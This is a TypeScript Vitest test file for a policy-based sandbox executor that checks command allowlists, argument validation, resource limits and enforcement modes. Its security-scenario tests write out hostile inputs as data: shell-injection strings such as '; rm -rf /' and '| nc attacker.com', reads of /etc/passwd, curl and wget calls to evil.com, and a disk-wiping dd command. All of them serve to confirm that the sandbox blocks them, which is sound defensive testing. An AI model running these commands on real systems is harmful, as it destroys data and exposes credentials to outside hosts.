/* eslint-disable @typescript-eslint/no-deprecated -- Tests for the deprecated sandbox executor surface (#2499). */
/**
 * Sandbox Executor Tests
 *
 * Tests for the policy-based sandbox executor.
 * Verifies command validation, environment preparation, and execution.
 *
 * @module security/sandbox/__tests__/sandbox-executor.test
 * (Source: Issue #162, Alignment Roadmap Phase 4)
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { PolicySandboxExecutor, createSandboxExecutor } from '../sandbox-executor.js';
import { STANDARD_POLICY, RESTRICTIVE_POLICY } from '../default-policies.js';
import type { SandboxExecutionOptions, SandboxPolicy } from '../sandbox-types.js';
import { DEFAULT_RESOURCE_LIMITS } from '../sandbox-types.js';

// Mock child_process
vi.mock('node:child_process', () => ({
  execFile: vi.fn(
    (
      _cmd: string,
      _args: string[],
      _opts: unknown,
      callback?: (err: null, result: { stdout: string; stderr: string }) => void
    ) => {
      // Default success behavior
      if (typeof callback === 'function') {
        callback(null, { stdout: 'success', stderr: '' });
      }
      return { stdout: 'success', stderr: '' };
    }
  ),
}));

// Mock util.promisify to return a mock function
vi.mock('node:util', () => ({
  promisify: vi.fn((_fn) => {
    return vi.fn().mockResolvedValue({ stdout: 'success', stderr: '' });
  }),
}));

describe('PolicySandboxExecutor', () => {
  let executor: PolicySandboxExecutor;

  beforeEach(() => {
    vi.clearAllMocks();
    executor = new PolicySandboxExecutor();
  });

  describe('constructor', () => {
    it('should create executor with default config', () => {
      const exec = new PolicySandboxExecutor();
      expect(exec.name).toBe('PolicySandboxExecutor');
    });

    it('should create executor with custom config', () => {
      const exec = new PolicySandboxExecutor({
        enforce: false,
        logViolations: false,
      });
      expect(exec.name).toBe('PolicySandboxExecutor');
    });
  });

  describe('validate', () => {
    const baseOptions: SandboxExecutionOptions = {
      policy: STANDARD_POLICY,
    };

    describe('command validation', () => {
      it('should allow valid commands', () => {
        const result = executor.validate('pnpm', ['test'], baseOptions);

        expect(result.allowed).toBe(true);
        expect(result.violations).toHaveLength(0);
        expect(result.policyId).toBe('standard');
      });

      it('should deny commands not in allowlist', () => {
        const result = executor.validate('unknowncmd', [], baseOptions);

        expect(result.allowed).toBe(false);
        expect(result.violations).toHaveLength(1);
        expect(result.violations[0]?.type).toBe('command');
        expect(result.reason).toContain('not in the allowlist');
      });

      it('should deny explicitly dangerous commands', () => {
        const result = executor.validate('rm', ['-rf', '/'], baseOptions);

        expect(result.allowed).toBe(false);
        expect(result.violations[0]?.reason).toContain('explicitly denied');
      });

      it('should deny commands with path separators', () => {
        const result = executor.validate('./malicious', [], baseOptions);

        expect(result.allowed).toBe(false);
        expect(result.violations[0]?.reason).toContain('path separators');
      });
    });

    describe('argument validation', () => {
      it('should allow safe arguments', () => {
        const result = executor.validate('pnpm', ['--version', '-v'], baseOptions);

        expect(result.allowed).toBe(true);
      });

      it('should deny dangerous argument patterns', () => {
        const dangerousArgs = [
          ['; rm -rf /'],
          ['&& cat /etc/passwd'],
          ['| nc attacker.com'],
          ['$(whoami)'],
          ['`id`'],
        ];

        for (const args of dangerousArgs) {
          const result = executor.validate('echo', args, baseOptions);
          expect(result.allowed).toBe(false);
          expect(result.violations.some((v) => v.type === 'command')).toBe(true);
        }
      });
    });

    describe('working directory validation', () => {
      it('should allow cwd within allowed paths', () => {
        const options: SandboxExecutionOptions = {
          policy: STANDARD_POLICY,
          cwd: process.cwd(),
        };

        const result = executor.validate('pnpm', ['test'], options);

        // cwd validation depends on pathRules
        expect(result.policyId).toBe('standard');
      });

      it('should deny cwd outside allowed paths', () => {
        const restrictiveOptions: SandboxExecutionOptions = {
          policy: RESTRICTIVE_POLICY,
          cwd: '/etc',
        };

        const result = executor.validate('echo', ['test'], restrictiveOptions);

        // May have path violation depending on policy
        expect(result.policyId).toBe('restrictive');
      });
    });

    describe('policy application', () => {
      it('should use policy allowedCommands', () => {
        const customPolicy: SandboxPolicy = {
          ...STANDARD_POLICY,
          id: 'custom',
          allowedCommands: ['customcmd'],
        };

        const options: SandboxExecutionOptions = {
          policy: customPolicy,
        };

        const result = executor.validate('customcmd', [], options);
        expect(result.allowed).toBe(true);

        const result2 = executor.validate('pnpm', [], options);
        expect(result2.allowed).toBe(false);
      });
    });
  });

  describe('execute', () => {
    const baseOptions: SandboxExecutionOptions = {
      policy: STANDARD_POLICY,
    };

    it('should return denied result for invalid commands', async () => {
      const result = await executor.execute('rm', ['-rf', '/'], baseOptions);

      expect(result.success).toBe(false);
      expect(result.exitCode).toBe(126); // Permission denied
      expect(result.stderr).toContain('Sandbox policy denied');
      expect(result.policyEvaluation.allowed).toBe(false);
    });

    it('should include policy evaluation in result', async () => {
      const result = await executor.execute('unknowncmd', [], baseOptions);

      expect(result.policyEvaluation).toBeDefined();
      expect(result.policyEvaluation.policyId).toBe('standard');
      expect(result.policyEvaluation.violations.length).toBeGreaterThan(0);
    });

    it('should track duration in milliseconds', async () => {
      const result = await executor.execute('rm', [], baseOptions);

      expect(result.durationMs).toBeGreaterThanOrEqual(0);
      expect(typeof result.durationMs).toBe('number');
    });

    it('should return empty resource usage for denied commands', async () => {
      const result = await executor.execute('rm', [], baseOptions);

      expect(result.resourceUsage.memoryBytes).toBe(0);
      expect(result.resourceUsage.cpuTimeMs).toBe(0);
      expect(result.resourceUsage.processCount).toBe(0);
    });
  });

  describe('resource limits', () => {
    it('should use default resource limits', () => {
      // Limits are applied during execution
      expect(DEFAULT_RESOURCE_LIMITS.maxMemoryBytes).toBe(512 * 1024 * 1024);
      expect(DEFAULT_RESOURCE_LIMITS.maxWallTimeMs).toBe(5 * 60 * 1000);
    });

    it('should allow overriding limits in options', () => {
      const overrideOptions: SandboxExecutionOptions = {
        policy: STANDARD_POLICY,
        limits: {
          maxWallTimeMs: 1000,
          maxMemoryBytes: 100 * 1024 * 1024,
        },
      };

      // Limits merge with defaults
      expect(overrideOptions.limits?.maxWallTimeMs).toBe(1000);
    });

    it('should use policy limits over defaults', () => {
      expect(RESTRICTIVE_POLICY.limits.maxMemoryBytes).toBe(128 * 1024 * 1024);
      expect(RESTRICTIVE_POLICY.limits.maxWallTimeMs).toBe(30 * 1000);
    });
  });

  describe('environment preparation', () => {
    it('should filter environment variables based on policy', () => {
      const envOptions: SandboxExecutionOptions = {
        policy: STANDARD_POLICY,
        env: {
          CUSTOM_VAR: 'value',
        },
      };

      // Environment filtering happens during execute
      // The actual filtering is tested in env-sanitizer tests
      const result = executor.validate('pnpm', ['test'], envOptions);
      expect(result.policyId).toBe('standard');
    });

    it('should block secret environment variables', () => {
      const optionsWithSecrets: SandboxExecutionOptions = {
        policy: STANDARD_POLICY,
        env: {
          API_KEY: 'secret',
          SAFE_VAR: 'value',
        },
      };

      // Secrets are filtered during execution
      const result = executor.validate('pnpm', [], optionsWithSecrets);
      expect(result.policyId).toBe('standard');
    });
  });

  describe('enforcement modes', () => {
    it('should enforce policy by default', async () => {
      const enforcingExecutor = new PolicySandboxExecutor({ enforce: true });
      const result = await enforcingExecutor.execute('rm', [], {
        policy: STANDARD_POLICY,
      });

      expect(result.success).toBe(false);
      expect(result.exitCode).toBe(126);
    });

    it('should allow execution when enforce is false', () => {
      const nonEnforcingExecutor = new PolicySandboxExecutor({ enforce: false });

      // Even with enforce: false, denied commands still go through validation
      // but execution might proceed (depending on implementation)
      const result = nonEnforcingExecutor.validate('rm', [], {
        policy: STANDARD_POLICY,
      });

      // Validation still reports violations
      expect(result.violations.length).toBeGreaterThan(0);
    });
  });

  describe('logging', () => {
    it('should log violations when enabled', async () => {
      const loggingExecutor = new PolicySandboxExecutor({
        logViolations: true,
        enforce: false,
      });

      await loggingExecutor.execute('rm', [], {
        policy: STANDARD_POLICY,
      });

      // Violations are logged (implementation detail)
    });

    it('should not log when logViolations is false', async () => {
      const silentExecutor = new PolicySandboxExecutor({
        logViolations: false,
        enforce: true,
      });

      await silentExecutor.execute('rm', [], {
        policy: STANDARD_POLICY,
      });

      // No logging (implementation detail)
    });
  });
});

describe('createSandboxExecutor', () => {
  it('should create a PolicySandboxExecutor', () => {
    const executor = createSandboxExecutor();

    expect(executor.name).toBe('PolicySandboxExecutor');
  });

  it('should pass config to executor', () => {
    const executor = createSandboxExecutor({
      enforce: false,
      logViolations: false,
    });

    expect(executor.name).toBe('PolicySandboxExecutor');
  });
});

describe('security scenarios', () => {
  let executor: PolicySandboxExecutor;

  beforeEach(() => {
    executor = new PolicySandboxExecutor();
  });

  describe('command injection prevention', () => {
    const options: SandboxExecutionOptions = {
      policy: STANDARD_POLICY,
    };

    it('should prevent shell command injection via arguments', () => {
      const injectionAttempts = [
        ['test', '; rm -rf /'],
        ['test', '&& cat /etc/passwd'],
        ['test', '|| curl evil.com'],
        ['test', '| nc attacker 1234'],
      ];

      for (const args of injectionAttempts) {
        const result = executor.validate('echo', args, options);
        expect(result.allowed).toBe(false);
      }
    });

    it('should prevent command substitution', () => {
      const substitutionAttempts = [['$(whoami)'], ['`id`'], ['${USER}']];

      for (const args of substitutionAttempts) {
        const result = executor.validate('echo', args, options);
        expect(result.allowed).toBe(false);
      }
    });
  });

  describe('privilege escalation prevention', () => {
    const options: SandboxExecutionOptions = {
      policy: STANDARD_POLICY,
    };

    it('should block sudo attempts', () => {
      const result = executor.validate('sudo', ['rm', '-rf', '/'], options);
      expect(result.allowed).toBe(false);
    });

    it('should block su attempts', () => {
      const result = executor.validate('su', ['-'], options);
      expect(result.allowed).toBe(false);
    });

    it('should block chmod attempts', () => {
      const result = executor.validate('chmod', ['777', '/'], options);
      expect(result.allowed).toBe(false);
    });

    it('should block chown attempts', () => {
      const result = executor.validate('chown', ['root', '/'], options);
      expect(result.allowed).toBe(false);
    });
  });

  describe('network access prevention', () => {
    const options: SandboxExecutionOptions = {
      policy: STANDARD_POLICY,
    };

    it('should block curl', () => {
      const result = executor.validate('curl', ['http://evil.com'], options);
      expect(result.allowed).toBe(false);
    });

    it('should block wget', () => {
      const result = executor.validate('wget', ['http://evil.com'], options);
      expect(result.allowed).toBe(false);
    });

    it('should block ssh', () => {
      const result = executor.validate('ssh', ['user@host'], options);
      expect(result.allowed).toBe(false);
    });

    it('should block netcat', () => {
      const result = executor.validate('nc', ['-l', '1234'], options);
      expect(result.allowed).toBe(false);
    });
  });

  describe('destructive command prevention', () => {
    const options: SandboxExecutionOptions = {
      policy: STANDARD_POLICY,
    };

    it('should block rm', () => {
      const result = executor.validate('rm', ['-rf', '/'], options);
      expect(result.allowed).toBe(false);
    });

    it('should block dd', () => {
      const result = executor.validate('dd', ['if=/dev/zero', 'of=/dev/sda'], options);
      expect(result.allowed).toBe(false);
    });

    it('should block shutdown', () => {
      const result = executor.validate('shutdown', ['-h', 'now'], options);
      expect(result.allowed).toBe(false);
    });

    it('should block reboot', () => {
      const result = executor.validate('reboot', [], options);
      expect(result.allowed).toBe(false);
    });
  });
});
